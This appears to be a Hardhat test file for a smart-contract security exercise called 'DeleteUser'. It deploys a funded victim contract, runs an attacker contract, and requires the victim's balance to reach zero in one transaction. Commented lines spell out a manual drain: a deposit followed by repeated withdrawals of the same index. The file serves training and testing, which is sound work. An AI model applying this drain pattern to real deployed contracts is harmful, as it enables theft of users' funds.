const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DeleteUser";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();
        await victimContract.deposit({ value: ethers.utils.parseEther("1") });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const attackerContract = await (
                await ethers.getContractFactory("AttackerDeleteUser")
            ).deploy(victimContract.address);
            await attackerContract
                .connect(attackerWallet)
                .attack(ethers.utils.parseEther("2"), ethers.utils.parseEther("1"), 1, {
                    value: ethers.utils.parseEther("3"),
                });
            // could be attacked even without smart contract
            // const victimContract = await VictimFactory.deploy();
            // await victimContract.connect(attackerWallet).deposit({ value: ethers.utils.parseEther("2") });
            // await victimContract.deposit({ value: ethers.utils.parseEther("1") });
            // await victimContract.connect(attackerWallet).withdraw(1);
            // await victimContract.connect(attackerWallet).withdraw(1);
        });

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.be.equal(0);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
                1,
                "must exploit one transaction"
            );
        });
    });
});
